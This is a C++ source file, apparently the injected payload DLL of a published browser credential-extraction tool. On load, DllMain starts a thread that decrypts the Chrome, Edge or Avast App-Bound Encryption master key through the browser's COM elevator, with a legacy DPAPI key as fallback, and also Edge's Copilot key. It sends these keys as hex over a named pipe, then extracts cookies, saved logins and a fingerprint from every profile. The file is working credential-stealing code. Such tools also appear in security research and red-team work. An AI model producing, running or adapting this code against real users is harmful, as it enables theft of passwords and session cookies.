// (c) Alexander 'xaitax' Hagenah
// Licensed under the MIT License. See LICENSE file in the project root for full license information.

#include "../core/common.hpp"
#include "../sys/bootstrap.hpp"
#include "../sys/internal_api.hpp"
#include "pipe_client.hpp"
#include "browser_config.hpp"
#include "data_extractor.hpp"
#include "fingerprint.hpp"
#include "../com/elevator.hpp"
#include <fstream>
#include <sstream>

using namespace Payload;

struct ThreadParams {
    HMODULE hModule;
    LPVOID lpPipeName;
};

// Returns empty vector on failure, sets errorMsg if provided.
// prefixSkip: number of bytes to strip from the start of the base64-decoded blob.
//   4 = skip 4-byte version header present in app_bound_encrypted_key blobs.
//   5 = skip the literal "DPAPI" prefix present in legacy encrypted_key blobs.
//   0 = return the raw decoded bytes without stripping anything.
std::vector<uint8_t> GetEncryptedKeyByName(const std::filesystem::path& localState, const std::string& keyName, std::string* errorMsg = nullptr, size_t prefixSkip = 4) {
    std::ifstream f(localState, std::ios::binary);
    if (!f) {
        if (errorMsg) *errorMsg = "Cannot open Local State";
        return {};
    }

    std::string content((std::istreambuf_iterator<char>(f)), std::istreambuf_iterator<char>());

    // Search for both compact ("key":"value") and spaced ("key": "value") JSON formats.
    std::string tag = "\"" + keyName + "\":\"";
    size_t pos = content.find(tag);
    if (pos == std::string::npos) {
        tag = "\"" + keyName + "\": \"";
        pos = content.find(tag);
        if (pos == std::string::npos) {
            if (errorMsg) *errorMsg = "Key not found: " + keyName;
            return {};
        }
    }

    pos += tag.length();
    size_t end = content.find('"', pos);
    if (end == std::string::npos) {
        if (errorMsg) *errorMsg = "Malformed JSON";
        return {};
    }

    std::string b64 = content.substr(pos, end - pos);

    DWORD size = 0;
    CryptStringToBinaryA(b64.c_str(), 0, CRYPT_STRING_BASE64, nullptr, &size, nullptr, nullptr);
    if (size < prefixSkip + 1) {
        if (errorMsg) *errorMsg = "Invalid key data (too small)";
        return {};
    }

    std::vector<uint8_t> data(size);
    CryptStringToBinaryA(b64.c_str(), 0, CRYPT_STRING_BASE64, data.data(), &size, nullptr, nullptr);

    return std::vector<uint8_t>(data.begin() + prefixSkip, data.end());
}

std::string KeyToHex(const std::vector<uint8_t>& key) {
    std::string hex;
    for (auto b : key) {
        char buf[3];
        sprintf_s(buf, "%02X", b);
        hex += buf;
    }
    return hex;
}

DWORD WINAPI PayloadThread(LPVOID lpParam) {
    auto params = std::unique_ptr<ThreadParams>(static_cast<ThreadParams*>(lpParam));
    LPCWSTR pipeName = static_cast<LPCWSTR>(params->lpPipeName);
    HMODULE hModule = params->hModule;

    {
        PipeClient pipe(pipeName);
        if (!pipe.IsValid()) {
            FreeLibraryAndExitThread(hModule, 0);
            return 1;
        }

        try {
            auto config = pipe.ReadConfig();
            auto browser = GetConfigs().at(config.browserType);

            pipe.LogDebug("Running in " + browser.name);

            // Initialize syscalls
            if (!Sys::InitApi(config.verbose)) {
                pipe.LogDebug("Warning: Syscall initialization failed.");
            }

            // Get ABE key - prefer App-Bound Encryption, fall back to legacy DPAPI
            std::string error;
            auto encKey = GetEncryptedKeyByName(browser.userDataPath / "Local State", "app_bound_encrypted_key", &error);

            std::vector<uint8_t> masterKey;

            if (!encKey.empty()) {
                // App-Bound Encryption path: decrypt key via COM elevator
                Com::Elevator elevator;
                masterKey = elevator.DecryptKey(encKey, browser.clsid, browser.iid, browser.iid_v2, browser.name == "Edge", browser.name == "Avast");
                if (!masterKey.empty()) {
                    pipe.Log("KEY:" + KeyToHex(masterKey));
                } else {
                    pipe.Log("NO_ABE:App-Bound Encryption key decryption returned empty result");
                }

                // Extract Copilot key for Edge
                if (browser.name == "Edge") {
                    auto asterEncKey = GetEncryptedKeyByName(browser.userDataPath / "Local State", "aster_app_bound_encrypted_key");
                    if (!asterEncKey.empty()) {
                        try {
                            Com::Elevator asterElevator;
                            auto asterKey = asterElevator.DecryptKeyEdgeIID(asterEncKey, browser.clsid, browser.iid);
                            pipe.Log("ASTER_KEY:" + KeyToHex(asterKey));
                        } catch (...) {
                            // Aster key decryption failed - silently continue
                        }
                    }
                }
            } else {
                // Log why ABE key lookup failed before attempting legacy fallback.
                if (!error.empty()) {
                    pipe.LogDebug("ABE key not found: " + error);
                }
                // Attempt legacy DPAPI fallback.
                // Chrome/Edge store the legacy key as base64("DPAPI" + <DPAPI-blob>) under
                // "encrypted_key".  We strip the 5-byte "DPAPI" prefix (prefixSkip=5) and call
                // CryptUnprotectData to recover the 32-byte AES key used for v10 blobs.
                auto dpApiBlob = GetEncryptedKeyByName(browser.userDataPath / "Local State", "encrypted_key", nullptr, 5);
                if (!dpApiBlob.empty()) {
                    DATA_BLOB input  = { static_cast<DWORD>(dpApiBlob.size()), dpApiBlob.data() };
                    DATA_BLOB output = {};
                    if (CryptUnprotectData(&input, nullptr, nullptr, nullptr, nullptr, 0, &output)) {
                        masterKey = std::vector<uint8_t>(output.pbData, output.pbData + output.cbData);
                        LocalFree(output.pbData);
                        pipe.Log("DPAPI_KEY:" + KeyToHex(masterKey));
                    } else {
                        pipe.Log("NO_ABE:Browser uses legacy DPAPI encryption (CryptUnprotectData failed: " + std::to_string(GetLastError()) + ")");
                    }
                } else {
                    pipe.Log("NO_ABE:No encryption key found in Local State");
                }
            }

            if (!masterKey.empty()) {
                DataExtractor extractor(pipe, masterKey, config.outputPath);

                for (const auto& entry : std::filesystem::directory_iterator(browser.userDataPath)) {
                    try {
                        if (entry.is_directory()) {
                            if (std::filesystem::exists(entry.path() / "Network" / "Cookies") ||
                                std::filesystem::exists(entry.path() / "Login Data")) {
                                extractor.ProcessProfile(entry.path(), browser.name);
                            }
                        }
                    } catch (...) {
                        // Continue to next profile if one fails
                    }
                }

                if (config.fingerprint) {
                    FingerprintExtractor fingerprinter(pipe, browser, config.outputPath);
                    fingerprinter.Extract();
                }
            }

        } catch (const std::exception& e) {
            pipe.Log("[-] " + std::string(e.what()));
        }
    }

    FreeLibraryAndExitThread(hModule, 0);
    return 0;
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, LPVOID lpReserved) {
    if (reason == DLL_PROCESS_ATTACH) {
        DisableThreadLibraryCalls(hModule);
        auto params = new ThreadParams{hModule, lpReserved};
        HANDLE hThread = CreateThread(NULL, 0, PayloadThread, params, 0, NULL);
        if (hThread) CloseHandle(hThread);
    }
    return TRUE;
}
